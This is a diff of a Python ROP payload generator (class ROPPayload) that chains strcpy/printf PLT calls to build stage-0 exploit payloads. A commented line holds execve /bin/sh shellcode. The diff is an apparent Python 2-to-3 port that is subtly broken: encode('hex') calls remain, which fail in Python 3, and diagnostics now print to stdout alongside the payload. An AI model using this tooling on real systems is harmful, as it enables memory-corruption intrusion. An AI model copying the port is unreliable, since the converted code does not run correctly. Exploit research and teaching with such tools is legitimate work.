@@ -413,7 +413,7 @@ class ROPPayload:
                 i += 1
             else:
                 offset = self.find_chars(code, c, maxlen, badchar)
-                #print "Found at:", hex(offset)
+                #print("Found at:", hex(offset)
                 k = offset
                 while k != -1 and (i+j) < l: # search for next char
                     if c.find("\x00") != -1: # contain null, stop
@@ -426,7 +426,7 @@ class ROPPayload:
                     else:
                         c = c[:-1]
                 if offset == -1:
-                    print >>sys.stderr, "Failed to find value: 0x" + c.encode('hex')
+                    print("Failed to find value: 0x" + c.encode('hex'))
                     failed += [c]
                     
                 dict[c] = offset
@@ -473,8 +473,7 @@ class ROPPayload:
     def msg(self, *strs):
         if self.debug == 1:
             for str in strs:
-                print >> sys.stderr, str, 
-            print >> sys.stderr
+                print(str)
             
     # generate stage-0 payload
     # raw format: binary
@@ -498,15 +497,15 @@ class ROPPayload:
         # convert stage-1 to strcpy chains
         address_list = self.find_hexstr(self.binary, stage1_str, max_str_len, badchar)
         if address_list == []:
-            print >>sys.stderr, "Failed to generate stage-0 payload, adjust your stage-1 then try again!\n"
+            print("Failed to generate stage-0 payload, adjust your stage-1 then try again!\n")
             return ""
             
         for (str, addr) in address_list:
             self.msg(hex(addr), str.encode('hex'), repr(str))
             payload += self.call_plt_function(loadfunc, target, addr)
             if self.filter_badchar(target, badchar) == -1:
-                print >>sys.stderr, "Warning: target address contains bad chars:", hex(target)
-                print >>sys.stderr, "Adjust your custom stack or stage-1 payload size", hex(target)
+                print("Warning: target address contains bad chars:", hex(target))
+                print("Adjust your custom stack or stage-1 payload size", hex(target))
 
             target += len(str)
 
@@ -516,7 +515,7 @@ class ROPPayload:
         self.msg("\nStage-0:", self.formatlist(payload))
         payload = self.list2hexstr(payload)
         self.msg("Stage-0 len: ", len(payload))
-        #print >>sys.stderr, "\nPayload in %s format:" % format              
+        #print("\nPayload in %s format:" % format              )
 
         if format == "raw": # default format
             return payload
@@ -579,7 +578,7 @@ if (__name__ == "__main__"):
         
     # generate stage-0
     stage0 = P.gen_stage0("printf", stage1, format = "str")
-    print stage0
+    print(stage0)
     
     # we can generate stage-0 for pre-built shellcode
     #execve_shellcode = "\xb0\x0b\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x65\xff\x15\x10\x00\x00\x00"
